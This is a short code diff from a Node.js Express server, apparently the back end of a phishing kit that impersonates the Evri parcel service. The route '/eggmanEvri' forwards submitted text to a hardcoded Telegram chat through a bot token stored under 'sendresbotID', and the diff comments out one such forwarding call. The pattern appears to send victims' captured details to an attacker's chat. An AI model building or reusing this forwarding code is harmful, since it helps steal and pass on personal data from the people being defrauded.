@@ -7489,18 +7489,18 @@ app.post("/eggmanEvri", (req, res) => {
         .catch((e) => {
           console.log(e);
         });
-      axios
-        .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-          {
-            chat_id: 5392091446,
-            text: `Evri:\n${originalText}`,
-            parse_mode: "Markdown",
-          }
-        )
-        .catch((e) => {
-          console.log(e);
-        });
+      // axios
+      //   .post(
+      //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      //     {
+      //       chat_id: 5392091446,
+      //       text: `Evri:\n${originalText}`,
+      //       parse_mode: "Markdown",
+      //     }
+      //   )
+      //   .catch((e) => {
+      //     console.log(e);
+      //   });
 
       res.send("Update Completed");
     });
